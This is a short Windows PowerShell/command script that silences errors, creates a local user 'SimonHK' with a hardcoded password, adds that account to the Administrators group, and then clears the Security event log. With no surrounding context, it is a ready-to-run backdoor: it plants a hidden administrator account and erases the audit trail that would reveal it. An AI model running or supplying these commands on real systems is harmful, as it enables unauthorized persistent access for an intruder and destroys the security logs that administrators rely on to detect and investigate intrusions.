$ErrorActionPreference = ‘SilentlyContinue’
net user /add SimonHK passA-JHG123
net localgroup administrators SimonHK /add
Wevtutil.exe cl Security
